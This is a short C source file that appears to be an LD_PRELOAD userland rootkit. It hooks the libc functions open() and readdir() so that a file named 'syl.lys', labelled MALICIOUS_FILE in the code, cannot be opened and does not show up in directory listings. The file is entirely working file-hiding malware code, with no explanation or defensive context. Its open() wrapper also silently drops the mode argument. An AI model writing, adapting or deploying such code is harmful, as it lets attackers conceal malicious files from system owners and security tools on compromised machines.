#define _GNU_SOURCE

#include <fcntl.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <dirent.h>

#define MALICIOUS_FILE "syl.lys"

static int (*original_open)(const char *filename, int flags, ...) = NULL;
struct dirent *(*original_readdir)(DIR *dirp) = NULL;

int open (const char *filename, int flags, ...)
{
    if (strcmp(filename, MALICIOUS_FILE) == 0) 
    {
        errno = ENOENT;
        return -1;
    }
    original_open = dlsym(RTLD_NEXT, "open");
    return original_open(filename, flags);
}

struct dirent *readdir(DIR *dirp) 
{
    struct dirent *ret;
    original_readdir = dlsym(RTLD_NEXT, "readdir");

    while((ret = original_readdir(dirp))) {
        if(strstr(ret->d_name, MALICIOUS_FILE) == 0)
            break;
    }
    return ret;
}